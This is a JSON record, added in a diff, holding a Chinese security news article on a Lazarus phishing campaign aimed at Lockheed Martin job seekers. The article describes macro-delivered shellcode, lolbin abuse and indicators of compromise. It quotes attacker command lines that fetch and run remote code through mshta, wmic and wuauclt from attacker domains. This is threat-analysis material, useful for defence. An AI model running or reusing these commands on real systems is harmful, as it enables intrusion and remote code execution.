@@ -1,0 +1,15 @@
+{
+  "doc_id": "lazarus_038",
+  "target_group": "lazarus",
+  "source_url": "https://www.freebuf.com/articles/network/322522.html",
+  "source_type": "news_article",
+  "source_name": "FreeBuf",
+  "title": "Lazarus 组织开始使用 lolbin 技术",
+  "language": "zh",
+  "raw_text": "研究人员发现了 Lazarus 的新攻击行动，利用国防部门的就业岗位信息进行诱饵钓鱼，已经发现了针对洛克希德马丁公司的求职者的定向攻击。洛克希德马丁公司是一家美国航空航天、武器、国防、信息安全和技术公司，同类也有其他公司类似主题的诱饵文件，例如诺斯罗普·格鲁曼公司和 BAE 国防工业公司。\n\n研究人员发现，Lazarus 组织首次使用 lolbin 技术，故而命名为 LolZarus。\n\n诱饵文档\n\n发现了两个钓鱼文档：Lockheed_Martin_JobOpportunities.docx和 Salary_Lockheed_Martin_job_opportunities_confidential.doc，都是由 Mickey用户创建的，其中的控制流劫持和宏代码基本一致。\n\n诱饵文档\n\n样本使用别名来重命名使用的 API：\n\n重命名\n\n红代码的入口点是通过 ActiveX Frame1_Layout 在启用 ActiveX 控件后自动执行：\n\n入口点\n\n宏代码首先加载 WMVCORE.DLL，这是 Windows 合法 DLL 文件。为了使宏代码看起来更正常，Lazarus 使用与 WMVCORE.DLL 导出函数相同的函数名和相关主题的变量名。\n\n宏代码\n\n宏代码在执行主要功能前要对文档变量进行检查，确保后续打开文档时不会重复执行。\n\n第二阶段\n\n二阶段的 Payload 作为 base64 编码的字符串数组嵌入在使用 CryptStringToBinaryW 函数解码的宏代码中。\n\nPayload\n\n其他变种也有使用 UuidFromStringA 函数来解码的。\n\n解码后的 Shellcode 检索所在地址并更改权限覆盖 WMVCORE.dll中的 WMIsAvailableOffline 函数。\n\n内存操作\n\nShellcode 的回调是通过 NtQueryInformationProcess 从当前进程的 PEB 结构中检索 KernelCallbackTable 指针，然后使 _fnDWORD 指针以指向 WMIsAvailableOffline 来实现的。这种控制流劫持技术，也被其他攻击者所使用。Lazarus 也使用其他新方法来执行 Shellcode，例如使用函数 EnumSystemLocalesA 作为对写入可执行堆的 Shellcode 的回调。\n\n接着，宏代码设置一个变量控制文档再打开不会重复执行，并通过 https://markettrendingcenter.com/lk_job_oppor.docx下载诱饵文档并显示。\n\n诱饵文档\n\nShellcode 通过创建一个新的临时文件夹（C:\\WMAuthorization），写入一个 VBS 文件（WMVxEncd.vbs）。再创建一个对应的计划任务（https://markettrendingcenter.com/member.htm）实现每二十分钟执行一次 VBS 文件。\n\nshellObj.Run \"forfiles /p c:\\windows /m HelpPane.exe /c \"\"mshta C:\\WMAuthorization\\WMPlaybackSrv \"\"https://markettrendingcenter.com/member.htm\"\"\"\"\", 0, True\n\n计划任务\n\n代码中 WMPlaybackSrv 是重命名的 wscript.exe，WindowsMediaPlayerVxEncdSrv 是重命名的 mshta.exe。在其他变种中，也使用过 lolbin wuauclt。\n\ncmd /C ''C:\\Windows\\system32\\wuauclt.exe' /UpdateDeploymentProvider wuaueng.dll /RunHandlerComServer\n\n早期的变种也使用了 wmic：\n\n%COMSPEC% /c Start /miN c:\\Intel\\hidasvc ENVIRONMENT get STATUS /FORMAT:”hxxps://www.advantims[.]com/GfxCPL.xsl”\n\n其他安全厂商也发现了使用 pcalua.exe 的变种。但在分析时，远程的 htm 文件已经不存在了，无法接续分析。\n\n结论\n\n本次发现的变种文件，与此前发现的 Lazarus 攻击使用的宏代码、攻击流程和钓鱼主题存在大量重合。\n\nLazarus 利用各种 Shellcode 执行技术并将 lolbins 作为攻击中的一部分，持续发起复杂攻击。\n\nIOC\n\ne87b575b2ddfb9d4d692e3b8627e3921\na27a9324d282d920e495832933d486ee\n3f326da2affb0f7f2a4c5c95ffc660cc\n490c885dc7ba0f32c07ddfe02a04bbb9\n712a8e4d3ce36d72ff74b785aaf18cb0\na27a9324d282d920e495832933d486ee\nf2a0e9034d67f8200993c4fa8e4f5d15\nmarkettrendingcenter.com\nlm-career.com\nadvantims.com\n\n参考来源\n\nQualys",
+  "published_date": "2022-02-19",
+  "crawl_time": "2026-07-07T16:58:12Z",
+  "tags": [
+    "基础安全"
+  ]
+}
